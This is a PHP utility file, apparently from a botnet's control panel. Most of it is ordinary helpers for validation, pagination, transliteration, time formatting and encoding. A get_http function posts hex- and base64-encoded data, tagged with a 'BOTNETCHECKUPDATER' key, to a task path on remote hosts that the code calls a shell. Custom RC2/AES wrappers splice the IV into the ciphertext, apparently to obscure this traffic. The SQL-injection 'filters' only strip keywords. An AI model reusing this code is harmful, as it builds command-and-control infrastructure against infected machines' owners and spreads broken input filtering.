<?php

function pregtrim($str){
   return preg_replace("/[^\x20-\xFF]/","",@strval($str));
}

function check_int($int){
   $int=trim(pregtrim($int));
   if ("$int"==intval($int)){
      return intval($int);
   }else{
      return false;
   }
}

function check_email($mail) {
   $mail=trim(pregtrim($mail));
   if (strlen($mail)==0) return false;
   if (!preg_match("/^[a-z0-9_.-]{1,20}@(([a-z0-9-]+\.)+(com|net|org|mil|edu|gov|arpa|info|biz|ru|ua|[a-z]{2})|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})$/is",$mail)){ return False; }else{ return $mail;}
}

function check_icq($icq){
   $icq=trim(pregtrim($icq));
   if (preg_match("!^[0-9]{5,15}$!",$icq)) return $icq;
   return false;
}

function TimeStampToStr($time_stamp, $time_zone = '+3', $format_date = 'd.m.Y H:i:s', $GMT_SHOW = True){
   switch($GMT_SHOW){
      case True:
	 return gmdate($format_date, $time_stamp + (60*60) * ($time_zone+date("I"))) . " (GMT " . $time_zone . ")";
      break;
      
      case False:
	 return gmdate($format_date, $time_stamp + (60*60) * ($time_zone+date("I")));
      break;
   }
}

function print_rm($str){
   echo '<pre>';
   print_r($str);
   echo '</pre>';
}

function size_format($size, $round = 2, $bps = false) {
   if($bps == false){
      $sizes = array(' B', ' kB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
      for ($i=0; $size > 1024 && $i < count($sizes) - 1; $i++) $size /= 1024;
   }else{
      $size = $size * 8;
      $sizes = array(' бит', ' килобит', ' мегабит', ' гигабит', ' терабит', ' pbps', ' ebps', ' zbps', ' tbps');
      for ($i=0; $size > 1000 && $i < count($sizes) - 1; $i++) $size /= 1000;
   }
   
   return round($size,$round).$sizes[$i];
}

function sql_inject(&$data){
   $data = str_ireplace('"', '', $data);
   $data = str_ireplace("'", '', $data);
   $data = str_ireplace("INTO OUTFILE", '', $data);
   $data = str_ireplace("OUTFILE", '', $data);
   $data = str_ireplace("SELECT", '', $data);
   //$data = str_ireplace("INSERT", '', $data);
   //$data = str_ireplace("DELETE", '', $data);
   //$data = str_ireplace("UPDATE", '', $data);
   $data = str_ireplace("UNION", '', $data);
   return $data;
}

function html_pages($link, $count, $count_page, $ajax = '0', $func_name = 'load_pages', $func_data = 'this'){
    global $Cur;

    $pages = ceil($count / $count_page);
    $pages = ($pages == 0 ? '1' : $pages);

    if($pages <= 2){
        $pages_html .= '&lt;&lt;&lt;&nbsp;';
    }else{
        $pages_html .= '<a href="'.$link.'"'.(($ajax == 1) ? ' onclick="return '.$func_name.'('.$func_data.');"' : '').'>&lt;&lt;&lt;</a>&nbsp;';
    }

    if($pages == 1){
        $pages_html .= ($Cur['page']-1) > -1 ? '&lt;&nbsp;' : '&lt;&nbsp;';
    }else{
        $pages_html .= ($Cur['page']-1) > -1 ? '<a href="'.$link.'&amp;page='.($Cur['page']-1).'"'.(($ajax == 1) ? ' onclick="return '.$func_name.'('.$func_data.');"' : '').'>&lt;</a>&nbsp;' : '<a href="'.$link.'&amp;page=0"'.(($ajax == 1) ? ' onclick="return '.$func_name.'('.$func_data.');"' : '').'>&lt;</a>&nbsp;';
    }

    for($i = $Cur['page']-10; $i < $Cur['page']; $i++){
        if($i > -1){
            $pages_html .= '<a href="'.$link.'&amp;page='.$i.'"'.(($ajax == 1) ? ' onclick="return '.$func_name.'('.$func_data.');"' : '').'>'.($i+1).'</a>&nbsp;';
        }
    }

    for($i = $Cur['page']; $i < $Cur['page']+10; $i++){
        if($i < $pages){
            if($Cur['page'] == $i){
                $pages_html .= $i+1 . " ";
            }else{
                if($i == 0){
                    $pages_html .= '<a href="'.$link.'"'.(($ajax == 1) ? ' onclick="return '.$func_name.'('.$func_data.');"' : '').'>'.($i+1).'</a>&nbsp;';
                }else{
                    $pages_html .= '<a href="'.$link.'&amp;page='.$i.'"'.(($ajax == 1) ? ' onclick="return '.$func_name.'('.$func_data.');"' : '').'>'.($i+1).'</a>&nbsp;';
                }
            }
        }
    }

    if($pages == 1){
        $pages_html .= '&gt;&nbsp;';
    }else{
        $pages_html .= '<a href="'.$link.'&amp;page='.($Cur['page']+1 < $pages ? $Cur['page']+1 : $Cur['page']).'"'.(($ajax == 1) ? ' onclick="return '.$func_name.'('.$func_data.');"' : '').'>&gt;</a>&nbsp;';
    }

    if($pages <= 2){
        $pages_html .= '&gt;&gt;&gt;&nbsp;';
    }else{
        $pages_html .= '<a href="'.$link.'&amp;page='.($pages-1).'"'.(($ajax == 1) ? ' onclick="return '.$func_name.'('.$func_data.');"' : '').'>&gt;&gt;&gt;</a>&nbsp;';
    }

    return $pages_html;
}

function ru2Lat($string){
   $rus = array('ё','ж','ц','ч','ш','щ','ю','я','Ё','Ж','Ц','Ч','Ш','Щ','Ю','Я');
   $lat = array('yo','zh','tc','ch','sh','sh','yu','ya','YO','ZH','TC','CH','SH','SH','YU','YA');
   $string = str_replace($rus,$lat,$string);
   $string = strtr($string,"АБВГДЕЗИЙКЛМНОПРСТУФХЪЫЬЭабвгдезийклмнопрстуфхъыьэ","ABVGDEZIJKLMNOPRSTUFH_I_Eabvgdezijklmnoprstufh_i_e");
   return($string);
}

function encapsules($st){
    $st = preg_replace('[0-9!@#$%^&*()]','', $st);
    $a = array('А'=>'A', 'Б'=>'B','В'=>'V','Г'=>'G','Д'=>'D','Е'=>'E','Ё'=>'JO','Ж'=>'ZH','З'=>'Z','И'=>'I','Й'=>'J','К'=>'K','Л'=>'L','М'=>'M','Н'=>'N','О'=>'O','П'=>'P','Р'=>'R','С'=>'S','Т'=>'T','У'=>'U','Ф'=>'F','Х'=>'KH','Ц'=>'TS','Ч'=>'CH','Ш'=>'SH','Щ'=>'SCH','Ъ'=>'','Ы'=>'Y','Ь'=>'','Э'=>'E','Ю'=>'JU','Я'=>'JA',' '=>'_');
    $b = array('а'=>'a', 'б'=>'b','в'=>'v','г'=>'g','д'=>'d','е'=>'e','ё'=>'jo','ж'=>'zh','з'=>'z','и'=>'i','й'=>'j','к'=>'k','л'=>'l','м'=>'m','н'=>'n','о'=>'o','п'=>'p','р'=>'r','с'=>'s','т'=>'t','у'=>'u','ф'=>'f','х'=>'kh','ц'=>'ts','ч'=>'ch','ш'=>'sh','щ'=>'sch','ъ'=>'','ы'=>'y','ь'=>'','э'=>'e','ю'=>'ju','я'=>'ja','|'=>'',' '=>'_','('=>'',')'=>'');
    $st = strtr($st, $a);
    $st = strtr($st, $b);
    return $st;
}

function real_escape_string(&$value){
   global $mysqli;
   $value = str_replace("'", '', $value);
   $value = str_replace('"', '', $value);
   return $mysqli->real_escape_string($value);
}
/*
function get_host($url){
	$url = str_replace('www.', '', $url);
	$base = @parse_url($url, PHP_URL_HOST); // PHP 5.2.1 or leter
	if(preg_match('~([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})~', $base)){
		return $base;
	}else{
		$parse = explode('.', $base);
		if(count($parse) == 2){
			return $base;
		}else{
			$num = count($parse)-2;
			if(strlen($parse[$num]) <= 3){
				return $parse[$num-1] . '.' . $parse[$num] . '.' . $parse[$num+1];
			}else{
				return $parse[$num] . '.' . $parse[$num+1];
			}
		}
	}
}
*/

function get_host($url){
   if(function_exists('idn_to_utf8')){
      return idn_to_utf8(@parse_url(str_replace('www.', '', strtolower($url)), PHP_URL_HOST));
   }else{
      return @parse_url(str_replace('www.', '', strtolower($url)), PHP_URL_HOST);
   }
}

function smarty_assign_add($name, $value, $eq = "\n"){
	global $smarty;
	if(isset($smarty->tpl_vars[$name])){
		$smarty->assign($name, $smarty->tpl_vars[$name] . $eq . $value);
	}else{
		$smarty->assign($name, $value);
	}
}

function get_http($link, $data, $key = 'BOTNETCHECKUPDATER1234567893', $shell = '/set/task.html'){
   $ch = curl_init();
   curl_setopt($ch, CURLOPT_URL, 'http://' . $link . $shell);
   curl_setopt($ch, CURLOPT_FAILONERROR, false);
   curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
   curl_setopt($ch, CURLOPT_TIMEOUT, 30);
   curl_setopt($ch, CURLOPT_POST, true);
   curl_setopt($ch, CURLOPT_HTTPHEADER, array( 'Expect:' ) );
   curl_setopt($ch, CURLOPT_VERBOSE, false);
   curl_setopt($ch, CURLOPT_POSTFIELDS, 'id='.$key.'&data=' . base64_encode(bin2hex($data)));
   $return =  curl_exec($ch);
   curl_close($ch);
   return $return;
}

function time_check($key, $value){
   global $text_time;
   $return = '';
   
   switch(strlen($value)){
      case '1':
	 $return = $text_time[$key][$value];
      break;
      
      case '2':
	 if(isset($text_time[$key][$value])){
	    $return = $text_time[$key][$value];
	 }else{
	    $return = time_check($key, substr($value, strlen($value)-1, strlen($value)));
	 }
	 
      break;
      
      default:
	 $return = time_check($key, substr($value, strlen($value)-2, strlen($value)));
      break;
   }
   
   return $return;
}

function time_math($s){
   global $text_time;
   
   $text_time['day'] = array('0' => 'дней', '1' => 'день', '2' => 'дня', '3' => 'дня', '4' => 'дня', '5' => 'дней', '6' => 'дней', '7' => 'дней', '8' => 'дней', '9' => 'дней', '11' => 'дней', '12' => 'дней', '13' => 'дней', '14' => 'дней');
   $text_time['hour'] = array('0' => 'часов', '1' => 'час', '2' => 'часа', '3' => 'часа', '4' => 'часа', '5' => 'часов', '6' => 'часов', '7' => 'часов', '8' => 'часов', '9' => 'часов', '11' => 'часов', '12' => 'часов', '13' => 'часов', '14' => 'часов');
   $text_time['min'] = array('0' => 'минут', '1' => 'минута', '2' => 'минуты', '3' => 'минуты', '4' => 'минуты', '5' => 'минут', '6' => 'минут', '7' => 'минут', '8' => 'минут', '9' => 'минут', '11' => 'минут', '12' => 'минут', '13' => 'минут', '14' => 'минут');
   $text_time['sec'] = array('0' => 'секунд', '1' => 'секунда', '2' => 'секунды', '3' => 'секунды', '4' => 'секунды', '5' => 'секунд', '6' => 'секунд', '7' => 'секунд', '8' => 'секунд', '9' => 'секунд', '11' => 'секунд', '12' => 'секунд', '13' => 'секунд', '14' => 'секунд');
   
   $time['sec'] =  $s%60;
   $m = floor($s/60);
   $time['min'] = $m%60;
   $m = floor($m/60);
   $time['hour'] = $m%24;
   $time['day'] = floor($m/24);
   $time = array_reverse($time);
   
   $return = '';
   foreach($time as $key => $value){
      if($value != '0'){
	 if(!empty($return)) $return .= ', ';
	 $return .= $value . ' ' . time_check($key, $value);
      }
   }
   
   return $return;
}

function generatePassword ($length = 8){
   $password = '';
   $possible = "0123456789aAbBcCdDfFgGhHjJkKmMnNpPqQrRsStTvVwWxXyYzZ";
   $i = 0;
   while ($i < $length){
      $char = substr($possible, mt_rand(0, strlen($possible)-1), 1);
      if (!strstr($password, $char)) {
	 $password .= $char;
	 $i++;
      }
   }
   
   $password = str_replace('BJB', 'JBJ', $password);
   return $password;
}

function rc_encode($str, $key = ''){
   global $rc, $no_base64;
   //$str = urldecode($str);
   if(empty($str)) return '';
   if(empty($key)) $key = $rc['key'];
   if(!isset($no_base64)) $no_base64 = false;
   $iv = generatePassword(8);
   $data = openssl_encrypt($str, 'RC2-CBC', $key, $no_base64, $iv);
   if(strpos($data, '==') !== false){
      return substr($iv, 0, 4) . substr($data, 0, strlen($data)-2) . substr($iv, 4, 8) . '==';
   }elseif(strpos($data, '=') !== false){
      return substr($iv, 0, 4) . substr($data, 0, strlen($data)-1) . substr($iv, 4, 8) . '=';
   }else{
      return substr($iv, 0, 4) . $data . substr($iv, 4, 8);
   }
}

function rc_decode($str, $key = ''){
   global $rc, $no_base64;
   $str = urldecode($str);
   if(empty($str)) return '';
   if(empty($key)) $key = $rc['key'];
   if(!isset($no_base64)) $no_base64 = false;
   $str = str_replace(' ', '+', $str);
   if(strpos($str, '==') !== false){
      $iv = substr($str, 0, 4) . str_replace('==', '', substr($str, strlen($str)-6, strlen($str)-4));
      return openssl_decrypt(substr($str, 4, strlen($str)-10) . '==', 'RC2-CBC', $key, $no_base64, $iv);
   }elseif(strpos($str, '=') !== false){
      $iv = substr($str, 0, 4) . str_replace('=', '', substr($str, strlen($str)-5, strlen($str)-3));
      return openssl_decrypt(substr($str, 4, strlen($str)-9) . '=', 'RC2-CBC', $key, $no_base64, $iv);
   }else{
      $iv = substr($str, 0, 4) . substr($str, strlen($str)-4, strlen($str));
      return openssl_decrypt(substr($str, 4, strlen($str)-8), 'RC2-CBC', $key, $no_base64, $iv);
   }
}

function rc_encode_aes($str, $key = ''){
   global $rc;
   if(empty($key)) $key = $rc['key'];
   $iv = generatePassword(16);
   $data = openssl_encrypt($str, 'AES-256-CBC', $key, false, $iv);
   if(strpos($data, '==') !== false){
      return substr($iv, 0, 8) . substr($data, 0, strlen($data)-2) . substr($iv, 8, 16) . '==';
   }elseif(strpos($data, '=') !== false){
      return substr($iv, 0, 8) . substr($data, 0, strlen($data)-1) . substr($iv, 8, 16) . '=';
   }else{
      return substr($iv, 0, 8) . $data . substr($iv, 8, 16);
   }
}

function rc_decode_aes($str, $key = ''){
   global $rc;
   if(empty($key)) $key = $rc['key'];
   $str = str_replace(' ', '+', $str);
   if(strpos($str, '==') !== false){
      $iv = substr($str, 0, 8) . str_replace('==', '', substr($str, strlen($str)-10, strlen($str)-8));
      return openssl_decrypt(substr($str, 8, strlen($str)-18) . '==', 'AES-256-CBC', $key, false, $iv);
   }elseif(strpos($str, '=') !== false){
      $iv = substr($str, 0, 8) . str_replace('=', '', substr($str, strlen($str)-9, strlen($str)-7));
      return openssl_decrypt(substr($str, 8, strlen($str)-17), 'AES-256-CBC', $key, false, $iv);
   }else{
      $iv = substr($str, 0, 8) . substr($str, strlen($str)-8, strlen($str));
      return openssl_decrypt(substr($str, 8, strlen($str)-16), 'AES-256-CBC', $key, false, $iv);
   }
}

function convert_encodin($str, $to = 'UTF-8'){
   $enc = mb_detect_encoding($str, $to . ", cp1251, ASCII");
   if($enc != $to){
      return mb_convert_encoding ($str, $to, $enc);
   }else{
      return $str;
   }
}

function convert_to($s, $to = 'UTF-8'){
   $z = '';
   $p = '';
   for($i = 0; $i < mb_strlen($s); $i++){
      $z = mb_substr($s, $i, 1);
      $enc = mb_detect_encoding($z, "UTF-8, Windows-1251,ASCII");
      if($enc != $to){
	 $p .= mb_convert_encoding($z, $to, 'Windows-1251');
      }else{
	 $p .= $z;
      }
   }
   return $p;
}

$lhtext = array();

?>